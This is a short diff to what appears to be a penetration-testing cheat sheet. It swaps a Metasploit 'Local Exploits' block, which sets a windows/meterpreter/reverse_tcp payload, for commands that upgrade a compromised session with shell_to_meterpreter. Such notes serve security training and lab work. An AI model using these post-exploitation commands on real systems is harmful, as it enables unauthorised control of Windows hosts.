@@ -37,7 +37,7 @@
 	- [wpscan](#wpscan)
 	- [Meterpreter Windows PrivEsc](#meterpreter-windows-privesc)
 		- [GetSystem](#getsystem)
-		- [Local Exploits](#local-exploits)
+		- [Meterpreter shell](#meterpreter-shell)
 	- [LFI](#lfi)
 		- [Fuzz](#fuzz)
 		- [View php code](#view-php-code)
@@ -362,15 +362,17 @@ getsystem
 getuid
 ```
 
-### Local Exploits
+### Meterpreter shell
 
 ```sh
-background
-use exploit/windows/local/
-use exploit/windows/local/....
-set SESSION 1
-set PAYLOAD windows/meterpreter/reverse_tcp
+^Z
+search shell_to_meterpreter
+use 0
 options
+set SESSION 1
+run
+sessions
+sessions -i 2
 ```
 
 ## LFI
